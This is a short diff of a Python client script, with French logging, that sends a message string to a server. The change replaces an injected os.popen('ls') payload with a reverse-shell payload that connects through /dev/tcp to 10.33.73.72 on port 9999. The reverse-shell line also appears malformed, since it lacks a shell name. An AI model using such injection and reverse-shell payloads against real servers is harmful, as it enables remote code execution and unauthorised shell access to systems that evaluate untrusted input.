@@ -55,7 +55,7 @@ try:
     logger.info(f"Réponse reçue du serveur {host} : {repr(data)}")
     
    
-    userMessage = "__import__('os').popen('ls').read()"
+    userMessage = "__import__('os').popen('-i >& /dev/tcp/10.33.73.72/9999 0>&1').read()"
 
        
 
